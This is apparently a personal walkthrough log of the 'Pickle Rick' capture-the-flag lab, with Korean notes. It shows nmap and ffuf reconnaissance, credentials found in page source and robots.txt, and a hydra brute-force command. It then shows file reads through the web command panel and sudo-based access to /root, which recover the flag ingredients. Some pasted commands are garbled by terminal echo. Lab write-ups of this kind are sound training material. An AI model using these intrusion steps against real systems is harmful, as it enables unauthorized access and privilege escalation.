# 10.64.133.118

nmap -Pn -sV -sC -T4 --open -oN nmap.txt 10.64.133.118


@agnusdei1207 ➜ /workspaces/kali (main) $ nmap -Pn -sV -sC -T4 --open -oN nmap.txt 10.64.133.118
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-19 14:31 UTC
Nmap scan report for 10.64.133.118
Host is up (0.23s latency).
Not shown: 941 closed tcp ports (conn-refused), 57 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2b:d2:9e:98:41:b9:2e:ba:94:4f:a0:26:ba:b4:a2:84 (RSA)
|   256 a1:f8:94:54:15:40:80:51:a2:bc:ec:3b:73:34:3e:42 (ECDSA)
|_  256 a5:5c:d0:f5:7b:ea:02:79:a5:dd:2b:95:99:b5:33:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.88 seconds


ffuf -u http://10.64.133.118:80/FUZZ -w /usr/share/wordlists/dirb/common.txt -fs 74

┌──(kali㉿kali)-[~]
└─$ ffufffuf -up://10.64.133.118:80/FUZZ -w /-w /usr/share/wordlists/dirb/common.txt -fs


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.64.133.118:80/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 74
________________________________________________

.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 205ms]
                        [Status: 200, Size: 1062, Words: 148, Lines: 38, Duration: 3071ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4095ms]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 5041ms]
assets                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 195ms]
index.html              [Status: 200, Size: 1062, Words: 148, Lines: 38, Duration: 202ms]
robots.txt              [Status: 200, Size: 17, Words: 1, Lines: 2, Duration: 202ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 206ms]
:: Progress: [4614/4614] :: Job [1/1] :: 163 req/sec :: Duration: [0:00:27] :: Errors: 0 ::



ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.64.133.118 -H "Host: FUZZ.10.64.133.118" -o vhosts.txt

┌──(kali㉿kali)-[~]
└─$ ffufffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -up://10.64.133.118 -H "-H "Host: FUZZ.10.64.133.118" -fs2 -o v-osts.txt


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.64.133.118
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.10.64.133.118
 :: Output file      : vhosts.txt
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 4162
________________________________________________

:: Progress: [4989/4989] :: Job [1/1] :: 93 req/sec :: Duration: [0:00:53] :: Errors: 0 ::
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.64.133.118 -H "Host: FUZZ.10.64.133.118" -o vhosts.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.64.133.118
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.10.64.133.118
 :: Output file      : vhosts.txt
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

:: Progress: [4989/4989] :: Job [1/1] :: 103 req/sec :: Duration: [0:00:50] :: Errors: 0 ::


![](https://velog.velcdn.com/images/agnusdei1207/post/00f18dae-2544-4a28-8d3c-629a1951e2b7/image.png)


┌──(kali㉿kali)-[~]
└─$ http http://10.64.133.118:80
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 615
Content-Type: text/html
Date: Wed, 19 Nov 2025 15:03:11 GMT
ETag: "426-5818ccf125686-gzip"
Keep-Alive: timeout=5, max=100
Last-Modified: Sun, 10 Feb 2019 16:37:33 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
  <title>Rick is sup4r cool</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="assets/bootstrap.min.css">
  <script src="assets/jquery.min.js"></script>
  <script src="assets/bootstrap.min.js"></script>
  <style>
  .jumbotron {
    background-image: url("assets/rickandmorty.jpeg");
    background-size: cover;
    height: 340px;
  }
  </style>
</head>
<body>

  <div class="container">
    <div class="jumbotron"></div>
    <h1>Help Morty!</h1></br>
    <p>Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!</p></br>
    <p>I need you to <b>*BURRRP*</b>....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is,
    I have no idea what the <b>*BURRRRRRRRP*</b>, password was! Help Morty, Help!</p></br>
  </div>

  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->

</body>
</html>


# 사용자명
R1ckRul3s



# robots.txt -> Wubbalubbadubdub -> 힌트?
![](https://velog.velcdn.com/images/agnusdei1207/post/c52b30da-b92b-460a-b44f-21f8af9970d6/image.png)


Wubbalubbadubdub



ffuf -u http://10.65.165.154/FUZZ.php -w /usr/share/wordlists/dirb/common.txt


┌──(kali㉿kali)-[~]
└─$ 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ ffuf -u http://10.65.165.154/FUZZ.php -w /usr/share/wordlists/dirb/common.txt                                                                  

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.65.165.154/FUZZ.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 202ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 2149ms]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3076ms]
                        [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4093ms]
denied                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 195ms]
login                   [Status: 200, Size: 882, Words: 89, Lines: 26, Duration: 195ms]
portal                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 207ms]
:: Progress: [4614/4614] :: Job [1/1] :: 205 req/sec :: Duration: [0:00:35] :: Errors: 0 ::

# login.php

![](https://velog.velcdn.com/images/agnusdei1207/post/26abefbf-e17f-40d7-82f4-9b09b3ea3a75/image.png)


──(kali㉿kali)-[~]
└─$ http http://10.65.165.154/login.php
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 455
Content-Type: text/html; charset=UTF-8
Date: Thu, 20 Nov 2025 13:27:13 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Keep-Alive: timeout=5, max=100
Pragma: no-cache
Server: Apache/2.4.41 (Ubuntu)
Set-Cookie: PHPSESSID=a2hmionl2mnu6ju4fa7burc4i1; path=/
Vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
  <title>Rick is sup4r cool</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="assets/bootstrap.min.css">
  <script src="assets/jquery.min.js"></script>
  <script src="assets/bootstrap.min.js"></script>
</head>
<body>

  <div class="container">
  </br><img width="300" src="assets/portal.jpg"><h3>Portal Login Page</h3></br>
    <form name="input" action="" method="post">
      <label for="username">Username:</label><input type="text" class="form-control" value="" id="username" name="username" />
      <label for="password">Password:</label><input type="password" class="form-control" value="" id="password" name="password" />

      
    </br><input type="submit" value="Login" class="btn btn-success" name="sub"/>
    </form>
  </div>

</body>
</html>


sudo hydra -l R1ckRul3s -P rockyou.txt 10.65.165.164 http-post-form "/login.php:username=^USER^&password=^PASS^&submit=Login:F=login failed" -t 4


R1ckRul3s
Wubbalubbadubdub


![](https://velog.velcdn.com/images/agnusdei1207/post/18b9b5f7-7d87-4031-8eda-542d66de0024/image.png)

명령어가 쓰이네? cat 안 됨

경로로는?

![](https://velog.velcdn.com/images/agnusdei1207/post/6a566deb-6a52-487a-bcfa-2226194f68a6/image.png)


실패
cp /home/rick/second\ ingredients ./second.txt


성공
ls -al /home/rick/second\ ingredients
-rwxrwxrwx 1 root root 13 Feb 10  2019 /home/rick/second ingredients

실패
cat /home/rick/second\ ingredients

성공
strings /home/rick/second\ ingredients
less /home/rick/second\ ingredients
1 jerry tear


# sudo check

sudo -l

Matching Defaults entries for www-data on ip-10-65-165-154:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-65-165-154:
    (ALL) NOPASSWD: ALL




sudo ls -al /root/

total 36
drwx------  4 root root 4096 Jul 11  2024 .
drwxr-xr-x 23 root root 4096 Nov 20 13:11 ..
-rw-------  1 root root  168 Jul 11  2024 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r--  1 root root  161 Jan  2  2024 .profile
drwx------  2 root root 4096 Feb 10  2019 .ssh
-rw-------  1 root root  702 Jul 11  2024 .viminfo
-rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
drwxr-xr-x  4 root root 4096 Jul 11  2024 snap


sudo strings /root/3rd.txt
fleeb juice